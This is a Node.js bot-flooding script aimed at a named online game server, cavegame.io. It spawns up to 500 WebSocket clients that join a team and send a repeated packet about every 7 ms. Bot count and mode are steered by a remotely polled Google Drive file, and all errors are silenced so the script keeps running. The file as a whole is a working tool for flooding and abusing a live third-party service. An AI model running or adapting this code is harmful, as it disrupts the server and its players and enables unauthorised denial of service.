const WebSocket = require("ws");
const { TextEncoder } = require("util");

const MODE_URL = "https://drive.google.com/uc?export=download&id=1Igt8Zf9xJ8VonOygxPb6KMb2qVQ2TD6g";
const WS_URL = "wss://ip-207-148-8-148.cavegame.io";
const encoder = new TextEncoder();

let CURRENT_MODE = 1;
let TARGET_BOT_COUNT = 50;

let SERVER_ONLINE = true;
let PROBE_ACTIVE = false;

let CONNECTING_COUNT = 0;

const HEARTBEAT_INTERVAL = 5000;
const TEAM_INTERVAL = 2000;
const INFINITE_INTERVAL = 7;
const MAX_BUFFER = 1024;

const TEAM_CREATE_PACKET = Uint8Array.from([49,33,47,116,101,97,109,32,99,114,101,97,116,101,32,84,101,115,116,101,114,115,32,103,51,56,57,56,101,110,97,107,108,49,48]);
const TEAM_JOIN_PACKET = Uint8Array.from([49,31,47,116,101,97,109,32,106,111,105,110,32,84,101,115,116,101,114,115,32,103,51,56,57,56,101,110,97,107,108,49,48]);
const TEAM_JOINED_PACKET = Uint8Array.from([24,0,0,12,84,101,97,109,32,106,111,105,110,101,100,33,4,103,111,111,100]);
const CHAT_JOIN_PACKET = Uint8Array.from([49,10,47,116,101,97,109,32,99,104,97,116]);
const INFINITE_PACKET = Uint8Array.from([49,120,0]);

const HEARTBEATS = [
    Uint8Array.from([34,0,0,0,0,0,64,128,0,192,195,166,192,0]),
    Uint8Array.from([34,0,0,0,0,0,194,143,255,252,67,177,63,255])
];

const bots = new Set();

function safeSend(ws, data, force = false) {
    if (ws.readyState !== WebSocket.OPEN) return;
    if (force) return ws.send(data);
    if (ws.bufferedAmount < MAX_BUFFER) ws.send(data);
}

function buildIntroPacket() {
    const name = encoder.encode("🔑" + Math.floor(Math.random() * 10000));
    const packet = new Uint8Array(3 + name.length);
    packet[0] = 31;
    packet[1] = 1;
    packet[2] = 13;
    packet.set(name, 3);
    return packet;
}

function isExactTeamJoined(data) {
    const bytes = new Uint8Array(data);
    if (bytes.length !== TEAM_JOINED_PACKET.length) return false;
    for (let i = 0; i < bytes.length; i++) {
        if (bytes[i] !== TEAM_JOINED_PACKET[i]) return false;
    }
    return true;
}

function parseConfig(text) {
    const lines = text.replace(/\r/g, "").split("\n").map(l => l.trim().toLowerCase());
    let mode = CURRENT_MODE;
    let amount = TARGET_BOT_COUNT;

    for (const line of lines) {
        if (line.startsWith("mode:")) {
            const val = parseInt(line.split(":")[1]?.trim());
            if (val === 1 || val === 2) mode = val;
        }
        if (line.startsWith("amount:")) {
            const val = parseInt(line.split(":")[1]?.trim());
            if (!isNaN(val) && val > 0) amount = val;
        }
    }

    return { mode, amount: Math.min(amount, 500) };
}

function attachBotHandlers(bot) {
    const ws = bot.ws;

    ws.on("open", () => {
        CONNECTING_COUNT = Math.max(0, CONNECTING_COUNT - 1);
        SERVER_ONLINE = true;

        safeSend(ws, Uint8Array.from([48]));
        safeSend(ws, buildIntroPacket());
        safeSend(ws, TEAM_CREATE_PACKET);

        bot.intervals.push(setInterval(() => {
            const packet = HEARTBEATS[bot.hbIndex % 2];
            bot.hbIndex++;
            safeSend(ws, packet, true);
        }, HEARTBEAT_INTERVAL));

        bot.intervals.push(setInterval(() => {
            if (!bot.joined) safeSend(ws, TEAM_JOIN_PACKET);
        }, TEAM_INTERVAL));

        bot.intervals.push(setInterval(() => {
            if (!bot.joined || CURRENT_MODE !== 1) return;

            const now = Date.now();
            if (now - bot.lastInfinite < INFINITE_INTERVAL) return;

            if (ws.bufferedAmount < MAX_BUFFER) {
                safeSend(ws, INFINITE_PACKET);
                bot.lastInfinite = now;
            }
        }, 10));
    });

    ws.on("message", (data) => {
        if (!bot.joined && isExactTeamJoined(data)) {
            bot.joined = true;
            safeSend(ws, CHAT_JOIN_PACKET);
        }
    });

    ws.on("error", () => {
        CONNECTING_COUNT = Math.max(0, CONNECTING_COUNT - 1);
        reconnectBot(bot);
    });

    ws.on("close", () => {
        CONNECTING_COUNT = Math.max(0, CONNECTING_COUNT - 1);
        reconnectBot(bot);
    });
}

function flushBotSocket(bot) {
    try {
        bot.ws.removeAllListeners();
        bot.ws.terminate();

        const ws = new WebSocket(WS_URL);
        bot.ws = ws;
        bot.joined = false;
        bot.hbIndex = 0;
        bot.lastInfinite = 0;

        attachBotHandlers(bot);
    } catch {}
}

function createBot() {
    CONNECTING_COUNT++;

    const bot = {
        ws: new WebSocket(WS_URL),
        joined: false,
        destroyed: false,
        intervals: [],
        hbIndex: 0,
        lastInfinite: 0
    };

    attachBotHandlers(bot);
    bots.add(bot);
}

function destroyBot(bot) {
    if (bot.destroyed) return;
    bot.destroyed = true;

    for (const i of bot.intervals) clearInterval(i);

    try {
        bot.ws.removeAllListeners();
        bot.ws.terminate();
    } catch {}

    bots.delete(bot);
}

function reconnectBot(bot) {
    destroyBot(bot);
    if (SERVER_ONLINE) startProbe();
}

function ensureBotCount() {
    if (!SERVER_ONLINE) return;

    const total = bots.size + CONNECTING_COUNT;

    if (total < TARGET_BOT_COUNT) {
        for (let i = 0; i < TARGET_BOT_COUNT - total; i++) {
            createBot();
        }
    }

    if (bots.size <= TARGET_BOT_COUNT) return;

    let excess = bots.size - TARGET_BOT_COUNT;

    const snapshot = Array.from(bots);
    const queued = [];
    const connected = [];

    for (const bot of snapshot) {
        if (bot.destroyed) continue;
        if (bot.joined) connected.push(bot);
        else queued.push(bot);
    }

    for (const bot of queued) {
        if (excess-- <= 0) break;
        destroyBot(bot);
    }

    for (const bot of connected) {
        if (excess-- <= 0) break;
        destroyBot(bot);
    }
}

function applyConfig(newMode, newAmount) {
    const modeChanged = newMode !== CURRENT_MODE;
    const amountChanged = newAmount !== TARGET_BOT_COUNT;

    if (!modeChanged && !amountChanged) return;

    const prevMode = CURRENT_MODE;

    CURRENT_MODE = newMode;
    TARGET_BOT_COUNT = newAmount;

    if (prevMode === 1 && newMode === 2) {
        for (const bot of bots) {
            flushBotSocket(bot);
        }
    }

    ensureBotCount();
}

async function fetchInitialConfig() {
    try {
        const res = await fetch(MODE_URL + "&t=" + Date.now());
        const txt = await res.text();
        const { mode, amount } = parseConfig(txt);

        CURRENT_MODE = mode;
        TARGET_BOT_COUNT = amount;
    } catch {}
}

async function pollConfigFile() {
    try {
        const res = await fetch(MODE_URL + "&t=" + Date.now());
        const txt = await res.text();
        const { mode, amount } = parseConfig(txt);

        applyConfig(mode, amount);
    } catch {}
}

async function init() {
    await fetchInitialConfig();
    ensureBotCount();
    setInterval(pollConfigFile, 3000);
    setInterval(ensureBotCount, 200);
}

init();

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
